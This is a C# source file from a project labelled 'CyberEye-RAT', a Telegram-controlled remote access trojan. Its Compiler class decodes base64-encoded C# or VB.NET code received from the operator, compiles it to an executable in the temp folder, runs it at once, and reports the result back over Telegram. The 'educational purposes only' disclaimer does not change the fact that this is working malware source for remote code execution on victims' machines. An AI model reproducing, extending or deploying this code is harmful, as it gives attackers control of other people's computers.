/*
       ^ Author    : Cisamu
       ^ Name      : CyberEye-RAT
       ^ Github    : https://github.com/cisamu123
       > This program is distributed for educational purposes only.
*/

using System;
using System.CodeDom.Compiler;
using System.Diagnostics;
using System.IO;
using Microsoft.CSharp;
using Microsoft.VisualBasic;

namespace TelegramRAT.modded
{
    internal class Compiler
    {
        //public static Random rand = new Random();
        //public static string difnum = rand.Next(0, 999999999).ToString();
        public static void CompileCsharp(string code)
        {
            code = utils.Base64Decode(code);
            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters
            {
                GenerateExecutable = true,
                OutputAssembly = Path.GetTempPath() + "outputcs.exe"
            };

            CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);

            if (results.Errors.HasErrors)
            {
                telegram.sendText("❌ Compilation failed! code must be in base64, u can encode this in https://www.base64encode.org/");
                foreach (CompilerError error in results.Errors)
                {
                    telegram.sendText(error.ErrorText);
                }
            }
            else
            {
                telegram.sendText("✅ Compilation successful! Executable created.");
                Process.Start(Path.GetTempPath() + "outputcs.exe");
            }
        }
        public static void CompileVbNet(string code)
        {
            code = utils.Base64Decode(code);
            VBCodeProvider provider = new VBCodeProvider();
            CompilerParameters parameters = new CompilerParameters
            {
                GenerateExecutable = true,
                OutputAssembly = Path.GetTempPath() + "outputvb.exe"
            };

            CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);

            if (results.Errors.HasErrors)
            {
                telegram.sendText("❌ Compilation failed! code must be in base64, u can encode this in https://www.base64encode.org/");
                foreach (CompilerError error in results.Errors)
                {
                    telegram.sendText(error.ErrorText);
                }
            }
            else
            {
                telegram.sendText("✅ Compilation successful! Executable created.");
                Process.Start(Path.GetTempPath() + "outputvb.exe");
            }
        }
    }
}
